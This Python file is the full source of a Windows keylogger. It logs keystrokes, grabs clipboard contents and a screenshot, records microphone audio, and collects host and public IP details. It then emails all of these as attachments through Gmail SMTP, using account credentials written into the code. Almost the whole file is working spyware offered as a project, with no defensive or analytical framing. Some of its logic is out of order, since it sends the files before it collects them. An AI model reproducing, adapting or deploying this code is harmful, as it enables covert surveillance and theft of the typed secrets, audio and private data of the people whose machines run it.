# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "keystrokesFile.txt"
system_information = "system_information.txt"
clipboard_information = "clipboard.txt"
audio_information = "microphoneAudio.wav"
screenshot_information = "screenshot.png"


microphone_Audio_time = 10

email_address = "keyloggerproject27@gmail.com"
password = "Keylogger2020"

toaddr = "keyloggerproject27@gmail.com"



file_path = "C:\Python Keylogger\Advance_Keylogger\Projectkeylogger"
extend = "\\"

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr,toaddr, text)
    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)
send_email(system_information, file_path + extend + system_information, toaddr)
send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
send_email(audio_information, file_path + extend + audio_information, toaddr)




def screenshot():
    img = ImageGrab.grab()
    img.save(file_path + extend + screenshot_information)

screenshot()

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_IPAddr = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_IPAddr + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + hostname + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

def microphone_Audio():
    fs = 44100
    seconds = microphone_Audio_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone_Audio()

count = 0
keys = []

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count +=1

    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
                f.close()
            elif k.find("enter") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key ==Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
#----------------------------- x ----------basic keylogger
